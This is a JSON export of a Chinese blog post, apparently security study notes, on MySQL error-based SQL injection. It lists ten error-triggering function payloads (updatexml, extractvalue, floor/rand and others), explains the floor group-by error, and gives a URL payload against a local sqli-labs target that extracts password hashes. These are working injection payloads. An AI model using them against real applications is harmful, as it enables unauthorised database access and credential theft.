{"pages":[],"posts":[{"title":"","text":"Mysql注入笔记(四) 报错注入在不能使用union联合注入时，需要使用报错注入，使用特殊的函数来报错。12345678910111213141516171819202122232425262728291.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 使用函数报错需要直到函数的使用方法和报错的原理，以floor()函数为例。1select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); 从里向外解读floor(rand(0)2)-&gt;rand()返回一个0到1的浮点数，若指定一个整数的参数N，则它被用作种子值，用来产生随机数，floor(x)返回不大于x的最大整数值。a与x为别名，在查询时建立临时的列或内容，如(xxx)a,a的列的内容为xxx。在使用floor报错时不能使用group_concat函数查询数据，只能使用limt逐个取值。使用conca()函数解读，如concat(user(),x)函数将user(),x拼接，得到字符串-&gt;user()0或user()1，此时查询时会判断虚拟表中有没有user()0如果没有则进行floor(rand(0)2)的第二次运算，第一次运算判断虚拟表中存不存在以有的数据段，如果有则count(*)增加1，如果没有则进行第二次运算并将数据插入虚拟表中，group by后为虚拟表中的主键，报错的关键是主键的改变(在mysql 数据库中主键是唯一的不能出现多个主键)。 其他函数可通过查阅php手册，mysql手册来解读。在使用报错注入中经常会遇到报错的字段长度或转码的长度限制于32位，可使用substr()函数截取分割123456789substr(string string,num start,num length);string为字符串start为起始位置length为长度127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- + 参考链接:404大佬的mysql注入文档:https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKIfloor函数解读:https://blog.csdn.net/he_and/article/details/80455884","link":"/2019/08/04/sql注入_mysql_4/"}],"tags":[],"categories":[]}